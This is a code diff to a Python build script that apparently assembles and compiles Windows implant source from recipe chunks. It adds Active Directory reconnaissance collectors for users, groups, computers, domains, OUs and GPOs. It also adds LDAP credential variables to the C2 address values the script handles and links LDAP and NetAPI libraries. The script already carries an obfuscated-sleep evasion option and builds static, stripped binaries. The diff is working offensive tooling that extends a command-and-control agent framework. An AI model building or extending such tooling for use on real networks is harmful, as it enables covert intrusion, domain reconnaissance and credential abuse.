@@ -55,6 +55,12 @@ FN_MAP = {
     "collectors/startup_items": "collect_startup_items",
     "collectors/recent_files": "collect_recent_files",
     "collectors/scheduled_tasks_recon": "collect_scheduled_tasks",
+    "ad_collectors/ad_users": "collect_users",
+    "ad_collectors/ad_groups": "collect_groups",
+    "ad_collectors/ad_computers": "collect_computers",
+    "ad_collectors/ad_domains": "collect_domains",
+    "ad_collectors/ad_ous": "collect_ous",
+    "ad_collectors/ad_gpos": "collect_gpos",
 }
 
 
@@ -74,9 +80,13 @@ def parse_chunk_metadata(chunk_path: Path) -> dict:
             elif line.startswith("// provides:"):
                 meta["provides"] = [p.strip() for p in line.split(":", 1)[1].strip().split(",")]
             elif line.startswith("// headers:"):
-                meta["headers"] = [h.strip() for h in line.split(":", 1)[1].strip().split(",")]
+                hval = line.split(":", 1)[1].strip()
+                if hval != "(none)":
+                    meta["headers"] = [h.strip() for h in hval.split(",")]
             elif line.startswith("// libs:"):
-                meta["libs"] = [l.strip() for l in line.split(":", 1)[1].strip().split(",")]
+                lval = line.split(":", 1)[1].strip()
+                if lval != "(none)":
+                    meta["libs"] = [l.strip() for l in lval.split(",")]
     return meta
 
 
@@ -275,8 +285,9 @@ def assemble(recipe_path: str, extra_vars: dict | None = None) -> str:
     if "evasion/sleep_encrypt" in evasion_list:
         output_parts.append("#define USE_OBF_SLEEP 1")
 
+    _skip_define = {"C2_IP", "C2_PORT", "LDAP_USER", "LDAP_DOMAIN", "LDAP_PASS"}
     for k, v in vars_dict.items():
-        if k not in ("C2_IP", "C2_PORT"):
+        if k not in _skip_define:
             output_parts.append(f"#define {k} {v}")
     output_parts.append("")
 
@@ -338,6 +349,7 @@ def compile_mingw(source_path: str, output_path: str, dll_def: str | None = None
     cmd.extend([
         "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
         "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
+        "-lwldap32", "-lnetapi32",
         "-static", "-s", "-Wl,--strip-all",
     ])
     if is_dll:
